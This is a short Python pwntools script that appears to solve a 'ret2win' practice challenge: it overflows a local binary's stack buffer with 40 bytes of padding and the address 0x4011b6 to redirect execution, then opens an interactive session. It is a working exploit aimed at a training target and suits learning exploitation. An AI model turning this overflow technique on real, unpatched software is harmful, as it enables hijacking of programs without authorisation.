#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = process('./ret2win')
offset = 40
win_addr = 0x4011b6
payload = b'A' * offset + p64(win_addr)

p.sendline(payload)
p.interactive()
